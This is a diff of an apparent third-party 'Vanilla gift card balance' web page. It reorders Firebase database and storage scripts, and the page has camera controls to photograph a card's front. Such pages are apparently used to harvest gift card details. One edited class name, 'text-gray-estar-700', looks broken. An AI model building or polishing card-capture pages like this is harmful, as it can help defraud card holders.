@@ -4,18 +4,18 @@
   <meta charset="UTF-8" /> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Check Vanilla Gift Card Balance</title>
-  <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-storage-compat.js"></script>
   
   <!-- Speed hints -->
   <link rel="preconnect" href="https://cdn.tailwindcss.com" crossorigin>
   <link rel="dns-prefetch" href="//cdn.tailwindcss.com">
 
   <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Firebase SDKs - LOADED ONCE, AFTER TAILWIND -->
   <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-storage-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-storage-compat.js"></script>
+
   <style>  
     body { font-family: 'Inter', sans-serif; background-color: #fff5f5; }  
   </style>  
@@ -174,7 +174,7 @@
   
             <div class="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-4">  
               <div class="text-center">  
-                <div class="text-sm text-gray-700 mb-2">Front</div>  
+                <div class="text-sm text-gray-estar-700 mb-2">Front</div>  
                 <video id="dualVideoFront" autoplay playsinline class="rounded-md w-full shadow"></video>  
                 <button type="button" id="captureFrontBtn" class="mt-2 px-3 py-2 bg-red-600 text-white rounded-md w-full">Capture Front</button>  
                 <img id="frontPreview" src="" alt="Front" class="mt-2 w-full rounded-md border border-gray-200 hidden" />  
